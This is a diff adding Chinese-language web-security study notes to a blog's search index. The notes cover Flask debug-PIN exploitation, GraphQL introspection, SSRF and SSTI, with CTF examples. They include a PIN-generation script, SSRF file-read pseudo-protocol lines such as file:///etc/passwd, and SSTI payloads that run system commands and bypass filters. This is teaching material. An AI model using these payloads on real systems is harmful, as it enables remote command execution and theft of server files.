@@ -4140,4 +4140,647 @@ insert into tables values(&#39;$email&#39;,&#39;$username&#39;,&#39;$password&#3
         <tag>格式化字符串漏洞</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Flask的debug模式下的pin码利用</title>
+    <url>/2025/01/10/Flask%E7%9A%84debug%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84pin%E7%A0%81%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<p>[TOC]</p>
+<span id="more"></span>
+
+<h1 id="Flask的debug模式下的pin码利用"><a href="#Flask的debug模式下的pin码利用" class="headerlink" title="Flask的debug模式下的pin码利用"></a>Flask的debug模式下的pin码利用</h1><p>题目链接：<a href="https://buuoj.cn/challenges#[GYCTF2020]FlaskApp">FlaskApp</a></p>
+<p><code>flask</code>在开启<code>debug</code>模式下，可以通过输入<code>pin</code>码进行代码调试模式，也就是<code>console</code>控制台。进入控制台之后再进行命令执行。</p>
+<ul>
+<li><code>username</code>：用户名</li>
+<li><code> modname</code>：默认值为<code>flask.app</code></li>
+<li><code>appname</code>：默认值为<code>Flask</code></li>
+<li><code>moddir</code>：<code>flask</code>库下<code>app.py</code>的绝对路径</li>
+<li><code> uuidnode</code>：当前网络的<code>mac</code>地址的十进制数。读取<code>/sys/class/net/eth0/address</code>得到十六进制数，转十进制即可。</li>
+<li><code>machine_id</code>：机器<code>id</code>。<code>Linux</code>环境下一般存放在<code>/etc/machine-id</code>或<code>/proc/sys/kernel/random/boot_id</code>文件，<code>docker</code>靶机则是<code>/proc/self/cgroup</code>。</li>
+</ul>
+<p>生成<code>pin</code>值的脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;28992066395378&#x27;</span>,  <span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>  <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+
+<p>然后使用<code>os</code>库的<code>popen</code>函数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GraphQL API学习总结</title>
+    <url>/2025/02/06/GraphQL%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>[TOC]</p>
+<span id="more"></span>
+
+<h2 id="GraphQL语言学习"><a href="#GraphQL语言学习" class="headerlink" title="GraphQL语言学习"></a>GraphQL语言学习</h2><p>下面所有GraphQL文档都可以在<a href="https://hasura.io/learn/graphql/graphiql">在线graphiql网站</a>上面运行测试。</p>
+<h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><p>GraphQL的三种操作：查询(query)、变更(mutation)、订阅(subscription)</p>
+<p>这是一个带有查询操作的GraphQL文档示例：</p>
+<figure class="highlight fsharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">query</span>&#123;</span><br><span class="line">  <span class="keyword">users</span>&#123;</span><br><span class="line">    <span class="built_in">id</span></span><br><span class="line">    name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h4><p>一个GraphQL字段描述一条独立信息。该信息可简单可复杂，含有数据之间的关系。在上述文档，操作中包含的全部内容，即<strong>users、id和name都是字段</strong>。</p>
+<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>将字段想象成可以返回值的函数，他们也可以接收行为不同的参数，如：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">users</span>(<span class="built_in">limit</span>:5,order_by: &#123;<span class="built_in">id</span>:asc&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>该示例中，users字段接收参数limit，以限制返回的结果的数量，<code>order_by</code>参数用来将返回的结果进行排序，<code>&#123;id:asc&#125;</code>表示以id字段进行升序排序。</p>
+<h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">query (<span class="variable">$limit</span>: Int) &#123;</span><br><span class="line">  <span class="built_in">users</span>(<span class="built_in">limit</span>: <span class="variable">$limit</span>) &#123;</span><br><span class="line">    <span class="built_in">id</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该变量在操作的顶部定义，且该变量的值可由客户端以服务器理解的格式发送。 通常变量以JSON表示，如下所示：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    limit<span class="punctuation">:</span><span class="number">5</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="操作名称"><a href="#操作名称" class="headerlink" title="操作名称"></a>操作名称</h4><p>当文档中含有多个操作时，服务器必须了解执行哪些操作并以相同的顺序将结果映射回来。 例如：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">query fetchUser &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">query fetchUsers &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="片段"><a href="#片段" class="headerlink" title="片段"></a>片段</h4><p>片段可以提高GraphQL的重用性。 如果文档中的某些部分在给定的类型上重用相同的字段集，那么片段就大有帮助。如：</p>
+<figure class="highlight fsharp"><table><tr><td class="code"><pre><span class="line">fragment userFields on <span class="keyword">users</span>&#123;</span><br><span class="line">  <span class="built_in">id</span></span><br><span class="line">  name</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">query</span>&#123;</span><br><span class="line">  <span class="keyword">users</span>&#123;</span><br><span class="line">    <span class="operator">...</span>userFields</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此处对片段的使用<code>...userFields</code>，这种用法叫作片段扩展。 还有内联片段，即没有分别明确声明片段却在查询中内联使用了它。</p>
+<h4 id="指示"><a href="#指示" class="headerlink" title="指示"></a>指示</h4><p>GraphQL规范支持的一些默认服务器指示包括：</p>
+<ul>
+<li>@deprecated(reason: String) - 将字段标为已弃用</li>
+<li>@skip(if: Boolean) - 跳过该字段的 GraphQL 执行</li>
+<li>@include(if: Boolean) - 如果为 true，则为带注解的字段调用解析器。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">query (<span class="variable">$showName</span>: Boolean!)&#123;</span><br><span class="line">  <span class="built_in">users</span>&#123;</span><br><span class="line">    <span class="built_in">id</span></span><br><span class="line">    name @include(<span class="keyword">if</span>: <span class="variable">$showName</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="内省查询"><a href="#内省查询" class="headerlink" title="内省查询"></a>内省查询</h3><p>简单来说就是，GraphQL内置了接口文档，你可以通过内省的方法获得这些信息，如对象定义、接口参数等信息。<br>GraphQL服务器公开以下有关Query操作类型的内省查询：</p>
+<ul>
+<li>__schema</li>
+<li>__type</li>
+<li>__typename</li>
+</ul>
+<p>当使用者不知道某个GraphQL接口中的类型哪些是可用的，可以通过__schema字段来向GraphQL查询哪些类型是可用的。如：</p>
+<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  __schema&#123;</span><br><span class="line">    types&#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102048775.png" alt="image-20250207182426398" style="zoom: 67%;" />
+
+<h2 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h2><h3 id="NewStarCTF-公开赛赛道-ezAPI"><a href="#NewStarCTF-公开赛赛道-ezAPI" class="headerlink" title="[NewStarCTF 公开赛赛道]ezAPI"></a>[NewStarCTF 公开赛赛道]ezAPI</h3><p>payload:</p>
+<figure class="highlight wren"><table><tr><td class="code"><pre><span class="line"><span class="variable">id</span><span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span><span class="variable">data</span><span class="operator">=</span>&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;&#123;<span class="char escape_">\n</span>  __schema&#123;<span class="char escape_">\n</span>    types&#123;<span class="char escape_">\n</span>      name<span class="char escape_">\n</span>    &#125;<span class="char escape_">\n</span>  &#125;<span class="char escape_">\n</span>&#125;<span class="char escape_">\n</span><span class="char escape_">\n</span>&quot;</span>,<span class="string">&quot;variables&quot;</span>:<span class="literal">null</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;query&#123;<span class="char escape_">\n</span>ffffllllaaagggg_1n_h3r3_flag(id:1) &#123;<span class="char escape_">\n</span>flag<span class="char escape_">\n</span>&#125;<span class="char escape_">\n</span>&#125;<span class="char escape_">\n</span>&quot;</span>, <span class="string">&quot;variables&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：</p>
+<p><a href="https://hasura.io/learn/zh/graphql/intro-graphql/graphql-queries/">通过 GraphQL 查询抓取数据 | GraphQL 教程</a></p>
+<p><a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">玩转graphQL</a></p>
+<p><a href="https://carsaid.github.io/burpsuite-learn/wsa/notes/advanced/graphql/#graphql%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86">GraphQL API漏洞笔记 | 某不知名博客</a></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSRF漏洞总结</title>
+    <url>/2024/09/10/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
+<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<span id="more"></span>
+
+<h2 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h2><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>
+<p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
+<h2 id="漏洞产生函数"><a href="#漏洞产生函数" class="headerlink" title="漏洞产生函数"></a>漏洞产生函数</h2><p><strong><code>file_get_contents</code></strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>fsockopen</code></strong></p>
+<p>该函数在PHP中用于打开一个网络连接或者一个Unix套接字连接。进而来获取用户指定的url数据，其使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFsock</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$link</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;连接失败: <span class="subst">$errno</span> - <span class="subst">$errstr</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: close\r\n\r\n&quot;</span>;   <span class="comment">//构造$out,设置请求头</span></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">        <span class="variable">$contents</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>))&#123;</span><br><span class="line">            <span class="variable">$contents</span> .= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">GetFsock</span>(<span class="string">&quot;192.168.1.12&quot;</span>, <span class="number">80</span>, <span class="string">&quot;/eclipse_workspace/firstpro/flag&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>curl_exec</code></strong></p>
+<p>该函数用于执行由<code>curl_init</code>初始化的cURL会话。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CurlExec</span>(<span class="params"><span class="variable">$link</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();   <span class="comment">//初始化cURL会话</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">0</span>);   <span class="comment">//设置为 0，表示使用 GET 方法请求数据。</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$link</span>);   <span class="comment">//设置要请求的 URL。</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">//表示将 cURL 的输出作为字符串返回，而不是直接输出到浏览器。</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);<span class="comment">//执行 cURL 会话</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);   <span class="comment">//关闭cURL会话</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">CurlExec</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#url=192.168.1.12/eclipse_workspace/firstpro/flag</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line"><span class="number">2.f</span>ile_get_contents的gopher协议不能URL编码</span><br><span class="line"><span class="number">3.f</span>ile_get_contents关于Gopher的<span class="number">302</span>跳转会出现bug，导致利用失败</span><br><span class="line"><span class="number">4.</span>curl/libcurl <span class="number">7.43</span> 上gopher协议存在bug(%<span class="number">00</span>截断) 经测试<span class="number">7.49</span> 可用</span><br><span class="line"><span class="number">5.</span>curl_exec() <span class="comment">//默认不跟踪跳转，</span></span><br><span class="line"><span class="number">6.f</span>ile_get_contents() <span class="comment">// file_get_contents支持php://input协议</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><blockquote>
+<p>3.1.排除法：浏览器f12查看源代码看是否是在本地进行了请求</p>
+<p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=URL,URL%E5%8F%82%E6%95%B0%E8%8B%A5%E6%98%AF%E5%85%B6%E4%BB%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%B0%E5%9D%80%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</a></p>
+<p>3.2.dnslog等工具进行测试，看是否被访问(可以在盲打后台，用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</p>
+<p>3.3.抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址</p>
+<ul>
+<li>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</li>
+<li>通过二级域名暴力猜解工具模糊猜测内网地址</li>
+<li>通过file协议读取内网信息获取相关地址</li>
+</ul>
+<p>3.4.直接返回的Banner、title、content等信息</p>
+<p>3.5.留意布尔型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法。</p>
+</blockquote>
+<h2 id="SSRF中URL的伪协议"><a href="#SSRF中URL的伪协议" class="headerlink" title="SSRF中URL的伪协议"></a>SSRF中URL的伪协议</h2><p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p>
+<pre><code>file:/// 从文件系统中获取文件内容，如，file:///etc/passwd
+dict:// 字典服务器协议，访问字典资源，如，dict:///ip:port/info：
+sftp:// SSH文件传输协议或安全文件传输协议
+ldap:// 轻量级目录访问协议
+tftp:// 简单文件传输协议
+gopher:// 分布式文档传递服务，可使用gopherus生成payload
+</code></pre>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">file:<span class="regexp">//</span><span class="regexp">/etc/</span>hosts   <span class="comment">#显示当前操作系统网卡的IP</span></span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/arp   <span class="comment">#显示arp缓存表(寻找内网其他主机)</span></span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/fib_trie   <span class="comment">#显示当前网段路由信息</span></span><br></pre></td></tr></table></figure>
+
+<p>参考文章：</p>
+<p><a href="https://www.cnblogs.com/miruier/p/13907150.html">SSRF漏洞（原理、挖掘点、漏洞利用、修复建议） - Saint_Michael - 博客园</a></p>
+<p><a href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSTI漏洞基础知识学习</title>
+    <url>/2024/10/08/SSTI%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>服务器端模板注入（Server-Side Template Injection, SSTI）是一种安全漏洞，发生在Web应用程序的服务器端模板引擎处理用户输入时。当应用程序将未经验证或过滤的用户输入直接嵌入到模板中进行渲染时，攻击者可以注入恶意模板代码。这些恶意代码会被模板引擎执行，从而使攻击者能够读取服务器文件、执行系统命令或窃取敏感信息。</p>
+<span id="more"></span>
+
+<p>不同语言对应的<code>ssti</code>模板</p>
+<ul>
+<li>输入<code>&#123;&#123;7*‘7’&#125;&#125;</code>，返回<code>49</code>表示是 <code>Twig</code> 模块</li>
+<li>输入<code>&#123;&#123;7*‘7’&#125;&#125;</code>，返回<code>7777777</code>表示是 <code>Jinja2</code> 模块</li>
+</ul>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">python:</span>jinja2/mako/tornado/django</span><br><span class="line">php   <span class="symbol">:smarty/twig/Blade</span></span><br><span class="line">java  <span class="symbol">:jade/velocity/jsp</span></span><br></pre></td></tr></table></figure>
+
+<p>​	在_HTTP_协议中，<code>X-Forwarded-For</code>是一个拓展头部字段，用于在_HTTP_ 请求通过代理或负载均衡器时，标识原始请求的来源_IP_ 地址。</p>
+<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">error?msg=</span><span class="template-variable">&#123;&#123;<span class="name">handler.settings</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="smarty-ssti"><a href="#smarty-ssti" class="headerlink" title="smarty ssti"></a><code>smarty ssti</code></h2><p><em>smarty_是一个_php_的模板引擎，提供让程序逻辑与页面显示代码（_css&#x2F;html</em> ）分离的功能。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;   #获取smarty的版本号</span><br></pre></td></tr></table></figure>
+
+<h3 id="if-if"><a href="#if-if" class="headerlink" title="{if}{/if}"></a><code>&#123;if&#125;&#123;/if&#125;</code></h3><p>​	<em>Smarty_的<code>&#123;if&#125;</code>条件判断，要求每个<code>&#123;if&#125;</code>必须有一个配对的<code>&#123;/if&#125;</code>，也可以使用<code>&#123;else&#125;&#123;elseif&#125;</code>，全部的_php</em> 条件表达式和函数都可以在_if_ 内使用，如<code>||*,or,&amp;&amp;,and,is_array()</code>等，还可以执行一些系统命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&quot;ls /&quot;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><p>&#x3D;&#x3D;<code>smarty ssti</code>漏洞&#x3D;&#x3D;</p>
+<p><code>bp</code>抓包</p>
+<p>添加<code>X-Forwarded-For:&#123;2-1&#125;</code>，发送，找到注入点，右上角_IP_ 为<code>1</code>。如果是<code>x-Forwarded-For:10</code>，显示的_IP_ 为<code>10</code>；<code>x-Forwarded-For:&#123;7-2&#125;</code>，显示的_IP_ 为<code>5</code>。</p>
+<p>重新抓包</p>
+<p>添加<code>X-Forwarded-For:&#123;if readfile(&#39;/flag&#39;)&#125;&#123;/if&#125;</code>，发送，找到<code>flag</code></p>
+<h2 id="jinja2-ssti"><a href="#jinja2-ssti" class="headerlink" title="jinja2 ssti"></a><code>jinja2 ssti</code></h2><p>一些基础的方法：</p>
+<ul>
+<li><code>__class__</code>：返回一个实例所属的类</li>
+<li><code>__bases__</code>：以元组形式返回一个类直接所继承的类（可以理解为直接父类）。<br><code>__base__</code>：和上面的<code>__bases__</code>大概相同，都是返回当前类所继承的类，即基类，区别是<code>__base__</code>返回单个，<code>__bases__</code>返回是元组。</li>
+<li><code>__mro__</code>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</li>
+<li><code>__subclasses__</code>：返回当前类的子类，也可以通过索引的方式定位一个子类。</li>
+<li><code>__init__</code>：类的初始化方法。</li>
+</ul>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>字符串拼接</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &#123;&#123;sesssion[&#x27;__class__&#x27;]&#125;&#125;</span></span><br><span class="line">&#123;&#123;session[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>&#123;&#123;&#125;&#125;</code>被过滤，可以用<code>&#123;%%&#125;</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(lipsum|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)()) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果下面列表中的元素全部被过滤，可以使用编码绕过</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;length&#x27;</span>,<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;string&#x27;</span>,<span class="string">&#x27;config&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p><code>Unicode</code>编码</p>
